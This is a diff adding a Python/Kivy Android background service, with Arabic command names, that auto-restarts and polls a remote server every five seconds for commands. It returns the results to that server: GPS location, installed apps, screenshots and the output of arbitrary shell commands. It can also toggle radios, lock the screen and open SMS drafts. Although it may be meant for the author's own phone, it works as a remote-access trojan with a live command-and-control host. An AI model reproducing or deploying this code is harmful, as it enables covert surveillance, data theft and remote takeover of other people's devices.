@@ -1,0 +1,149 @@
+from kivy.app import App
+from kivy.clock import Clock
+from jnius import autoclass, cast
+import requests
+import os
+import subprocess
+#Android APIs
+PythonService = autoclass('org.kivy.android.PythonService')
+Context = autoclass('android.content.Context')
+Intent = autoclass('android.content.Intent')
+Uri = autoclass('android.net.Uri')
+WifiManager = autoclass('android.net.wifi.WifiManager')
+BluetoothAdapter = autoclass('android.bluetooth.BluetoothAdapter')
+AudioManager = autoclass('android.media.AudioManager')
+LocationManager = autoclass('android.location.LocationManager')
+PackageManager = autoclass('android.content.pm.PackageManager')
+
+SERVER_URL = "https://agent-server-1-hstg.onrender.com/command"
+DEVICE_ID = "my_phone_001"
+
+class BackgroundService(App):
+    def build(self):
+        Clock.schedule_interval(self.check_commands, 5)
+        self.start_foreground_service()
+        return None
+
+    def start_foreground_service(self):
+        service = PythonService.mService
+        service.setAutoRestartService(True)
+
+    def check_commands(self, dt):
+        try:
+            r = requests.post(SERVER_URL, json={"device_id": DEVICE_ID}, timeout=10)
+            command = r.json().get("command")
+            if command:
+                result = self.execute_command(command)
+                requests.post(SERVER_URL + "/result", json={"device_id": DEVICE_ID, "result": result})
+        except:
+            pass
+
+    def execute_command(self, cmd):
+        ctx = PythonService.mService.getApplicationContext()
+        try:
+            # 1. التحكم بالجهاز
+            if cmd == "افتح الواي فاي":
+                wifi = ctx.getSystemService(Context.WIFI_SERVICE)
+                wifi.setWifiEnabled(True)
+                return "تم تشغيل الواي فاي"
+
+            elif cmd == "اقفل الواي فاي":
+                wifi = ctx.getSystemService(Context.WIFI_SERVICE)
+                wifi.setWifiEnabled(False)
+                return "تم إيقاف الواي فاي"
+
+            elif cmd == "افتح البلوتوث":
+                bt = BluetoothAdapter.getDefaultAdapter()
+                bt.enable()
+                return "تم تشغيل البلوتوث"
+
+            elif cmd == "اقفل البلوتوث":
+                bt = BluetoothAdapter.getDefaultAdapter()
+                bt.disable()
+                return "تم إيقاف البلوتوث"
+
+            elif cmd == "ارفع الصوت":
+                audio = ctx.getSystemService(Context.AUDIO_SERVICE)
+                audio.adjustVolume(AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
+                return "تم رفع الصوت"
+
+            elif cmd == "وطي الصوت":
+                audio = ctx.getSystemService(Context.AUDIO_SERVICE)
+                audio.adjustVolume(AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
+                return "تم تخفيض الصوت"
+
+            elif cmd == "شغل الفلاش":
+                os.system("su -c 'echo torch 1 > /sys/class/leds/led:torch_0/brightness'")
+                return "تم تشغيل الفلاش"
+
+            elif cmd == "اقفل الشاشة":
+                os.system("input keyevent 26")
+                return "تم إقفال الشاشة"
+
+            # 2. المعلومات والتصوير
+            elif cmd == "صور الشاشة":
+                path = "/sdcard/screenshot.png"
+                os.system(f"screencap -p {path}")
+                return f"تم التصوير: {path}"
+
+            elif cmd == "جيب البطارية":
+                battery = ctx.registerReceiver(None, Intent("android.intent.action.BATTERY_CHANGED"))
+                level = battery.getIntExtra("level", -1)
+                return f"البطارية: {level}%"
+
+            elif cmd == "جيب الموقع":
+                loc_manager = ctx.getSystemService(Context.LOCATION_SERVICE)
+                loc = loc_manager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                if loc:
+                    return f"خط العرض: {loc.getLatitude()}, خط الطول: {loc.getLongitude()}"
+                return "تعذر الحصول على الموقع"
+
+            elif cmd == "جيب التطبيقات":
+                pm = ctx.getPackageManager()
+                apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
+                names = [str(a.loadLabel(pm)) for a in apps][:20]
+                return "أهم التطبيقات: " + ", ".join(names)
+
+            # 3. التحكم بالتطبيقات
+            elif cmd.startswith("افتح "):
+                app_name = cmd.replace("افتح ", "")
+                os.system(f"monkey -p com.{app_name.lower()} -c android.intent.category.LAUNCHER 1")
+                return f"تم فتح {app_name}"
+
+            elif cmd.startswith("اكتب رسالة"):
+                # مثال: اكتب رسالة "السلام" لرقم 05xxxx
+                parts = cmd.split('"')
+                msg = parts[1] if len(parts) > 1 else "test"
+                number = cmd.split("لرقم ")[1] if "لرقم " in cmd else ""
+                uri = Uri.parse(f"smsto:{number}")
+                intent = Intent(Intent.ACTION_SENDTO, uri)
+                intent.putExtra("sms_body", msg)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                ctx.startActivity(intent)
+                return f"تم فتح رسالة لـ {number}"
+
+            elif cmd == "ارسل ملف":
+                return "ارسل الملف للسيرفر أولاً، بعدها بأرسله للجوال"
+
+            # 4. أوامر متقدمة
+            elif cmd.startswith("نفذ امر shell "):
+                shell_cmd = cmd.replace("نفذ امر shell ", "")
+                output = subprocess.getoutput(shell_cmd)
+                return output[:500] # حد 500 حرف
+
+            elif cmd == "احذف البرنامج":
+                pkg = ctx.getPackageName()
+                uri = Uri.fromParts("package", pkg, None)
+                intent = Intent(Intent.ACTION_DELETE, uri)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                ctx.startActivity(intent)
+                return "جاري حذف التطبيق..."
+
+            else:
+                return "الأمر غير معروف"
+
+        except Exception as e:
+            return f"خطأ: {str(e)}"
+
+if __name__ == "__main__":
+    BackgroundService().run()
